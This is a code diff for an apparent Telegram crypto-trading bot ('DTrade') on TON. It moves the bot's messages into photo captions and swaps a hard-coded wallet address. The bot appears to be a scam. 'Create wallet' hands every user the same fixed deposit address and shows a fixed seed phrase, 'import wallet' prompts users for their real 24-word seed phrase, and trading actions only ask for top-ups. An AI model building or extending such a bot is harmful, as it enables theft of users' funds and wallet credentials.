@@ -80,8 +80,20 @@ def send_welcome(message):
         "[] News: [DTrade News](https://t.me/dtrade_news) | Backup: [@dtrade_backup_bot](https://t.me/dtrade_backup_bot)\n"
     )
     
-    bot.send_message(message.chat.id, welcome_message, reply_markup=main_markup, parse_mode="Markdown", disable_web_page_preview=True)
+    #bot.send_message(message.chat.id, welcome_message, reply_markup=main_markup, parse_mode="MarkdownV2", disable_web_page_preview=True)
     
+    with open("start.jpg", "rb") as photo:
+        bot.send_photo(
+            message.chat.id,
+            photo,
+            caption=welcome_message,
+            reply_markup=main_markup,
+            parse_mode="Markdown"
+        )
+    
+    # bot.send_photo(message.chat.id, "start.jpg", caption=welcome_message, reply_markup=main_markup, parse_mode="MarkdownV2")
+    
+
     if message.from_user.id not in lochs:
         lochs[message.from_user.id] = [False, False]
 
@@ -101,7 +113,7 @@ def back_pressed(call):
         "[] News: [DTrade News](https://t.me/dtrade_news) | Backup: [@dtrade_backup_bot](https://t.me/dtrade_backup_bot)\n"
     )
     # bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,reply_markup=main_markup)
-    bot.edit_message_text(welcome_message, call.message.chat.id, call.message.message_id, reply_markup=main_markup, parse_mode="Markdown", disable_web_page_preview=True)
+    bot.edit_message_caption(welcome_message, call.message.chat.id, call.message.message_id, reply_markup=main_markup, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: call.data == "language")
 @bot.callback_query_handler(func=lambda call: call.data == "export_wallet")
@@ -119,7 +131,7 @@ def snipes_pressed(call):
     snipes_message = f"👁️ {user_name}, you don't have any snipes yet"
     
     # bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, snipes_message, reply_markup=snipes_markup)
-    bot.edit_message_text(snipes_message, call.message.chat.id, call.message.message_id, reply_markup=snipes_markup)
+    bot.edit_message_caption(snipes_message, call.message.chat.id, call.message.message_id, reply_markup=snipes_markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "snipe_deployer")
 @bot.callback_query_handler(func=lambda call: call.data == "snipe_jetton")
@@ -127,9 +139,9 @@ def snipe_deployer_pressed(call):
     logger.info(f"❌ {call.from_user.first_name} | @{call.from_user.username} - {call.data}")
 
     if lochs[call.from_user.id][0]:
-        bot.edit_message_text("❌ Top up your wallet", call.message.chat.id, call.message.message_id, reply_markup=snipe_jetton_markup)
+        bot.edit_message_caption("❌ Top up your wallet", call.message.chat.id, call.message.message_id, reply_markup=snipe_jetton_markup)
     else:
-        bot.edit_message_text("❌ First create a wallet", call.message.chat.id, call.message.message_id, reply_markup=snipe_jetton_markup)
+        bot.edit_message_caption("❌ First create a wallet", call.message.chat.id, call.message.message_id, reply_markup=snipe_jetton_markup)
 
 
 @bot.callback_query_handler(func=lambda call: call.data == "snipe_cancel")
@@ -153,7 +165,7 @@ def wallets_pressed(call):
         wallets_markup.row(create_btn, export_btn)
         wallets_markup.row(import_btn, back_btn)
     
-    bot.edit_message_text(wallets_message, call.message.chat.id, call.message.message_id, reply_markup=wallets_markup)
+    bot.edit_message_caption(wallets_message, call.message.chat.id, call.message.message_id, reply_markup=wallets_markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "delete_wallet")
 def delete_wallet_pressed(call):
@@ -164,7 +176,7 @@ def delete_wallet_pressed(call):
 def create_wallet_pressed(call):
     logger.info(f"➕ {call.from_user.first_name} | @{call.from_user.username} - Create wallet")
     
-    wallet_address = "UQBulhlC3EtbCDH-FxNi_vKSJ7T22V3PI4IAa-5UpRBcWbhK"
+    wallet_address = "UQCB1yuLUkanK8OiORzDsludn_MucWPC9ReD11s9TARFWG2G"
     wallet_message = (
         f"💎 Wallet ...<a href='https://tonviewer.com/{wallet_address}'>BcWbhK</a>\n\n"
         f"🔖 Address »\n<code>{wallet_address}</code>\n\n"
@@ -173,7 +185,7 @@ def create_wallet_pressed(call):
 
     lochs[call.from_user.id][0] = True
 
-    bot.edit_message_text(wallet_message, call.message.chat.id, call.message.message_id, reply_markup=create_wallet_markup, disable_web_page_preview=True, parse_mode="HTML")
+    bot.edit_message_caption(wallet_message, call.message.chat.id, call.message.message_id, reply_markup=create_wallet_markup, parse_mode="HTML")
 
 @bot.callback_query_handler(func=lambda call: call.data == "help")
 def help_pressed(call):
@@ -185,7 +197,7 @@ def help_pressed(call):
         "E-mail - dtradeton@gmail.com\n"
         "Dev - @dabload\n"
     )
-    bot.edit_message_text(help_message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(back_btn), parse_mode="HTML")
+    bot.edit_message_caption(help_message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(back_btn), parse_mode="HTML")
 
 @bot.callback_query_handler(func=lambda call: call.data == "auto buy")
 @bot.callback_query_handler(func=lambda call: call.data == "interface")
@@ -194,7 +206,7 @@ def first_crate_wallet_pressed(call):
     logger.info(f"❌ {call.from_user.first_name} | @{call.from_user.username} - First create {call.data}")
 
     auto_buy_message = "❌ First create a wallet"
-    bot.edit_message_text(auto_buy_message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(back_btn))
+    bot.edit_message_caption(auto_buy_message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(back_btn))
 
 @bot.callback_query_handler(func=lambda call: call.data == "show_seed")
 def show_seed_pressed(call):
@@ -205,7 +217,7 @@ def show_seed_pressed(call):
         "<code>soda excuse rocket mandate meadow vault legal coach prison opera identify resource approve rack raccoon appear trust sea already leopard census asset escape plug</code>\n\n"
         "📋 You can simply copy mnemonic by clicking on it"
     )
-    bot.edit_message_text(seed_phrase, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back", callback_data="show_seed_back")), disable_web_page_preview=True, parse_mode="HTML")
+    bot.edit_message_caption(seed_phrase, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back", callback_data="show_seed_back")), parse_mode="HTML")
 
 @bot.callback_query_handler(func=lambda call: call.data == "show_seed_back")
 def show_seed_back_pressed(call):
@@ -217,7 +229,7 @@ def show_seed_back_pressed(call):
 def import_wallet_pressed(call):
     logger.info(f"📥 {call.from_user.first_name} | @{call.from_user.username} - Import")
     
-    bot.edit_message_text("🌱 Enter your seed phrase (24 words):", call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🚫 Cancel", callback_data="cancel_seed_phrase")))
+    bot.edit_message_caption("🌱 Enter your seed phrase (24 words):", call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🚫 Cancel", callback_data="cancel_seed_phrase")))
     bot.register_next_step_handler(call.message, process_seed_phrase)
 
 def process_seed_phrase(message):
@@ -262,7 +274,7 @@ def referral_pressed(call):
         "Invite friends and acquaintances and receive TON to your wallet!"
     )
 
-    bot.edit_message_text(message, call.message.chat.id, call.message.message_id, reply_markup=referral_markup, parse_mode="HTML")
+    bot.edit_message_caption(message, call.message.chat.id, call.message.message_id, reply_markup=referral_markup, parse_mode="HTML")
 
 @bot.callback_query_handler(func=lambda call: call.data == "get_link")
 def get_link_pressed(call):
@@ -279,7 +291,7 @@ def get_link_pressed(call):
         "2.2) Top up your balance by >= 3 TON.</blockquote>\n"
     )
 
-    bot.edit_message_text(message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back", callback_data="get_link_back")), parse_mode="HTML")
+    bot.edit_message_caption(message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Back", callback_data="get_link_back")), parse_mode="HTML")
 
 @bot.callback_query_handler(func=lambda call: call.data == "get_link_back")
 def get_link_back_pressed(call):
@@ -289,6 +301,9 @@ def get_link_back_pressed(call):
 def back_link_pressed(call):
     back_pressed(call)
 
-bot.polling()
-
-
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(f"❌ Ошибка")
+        time.sleep(1)  # Подождать 5 секунд перед перезапуском
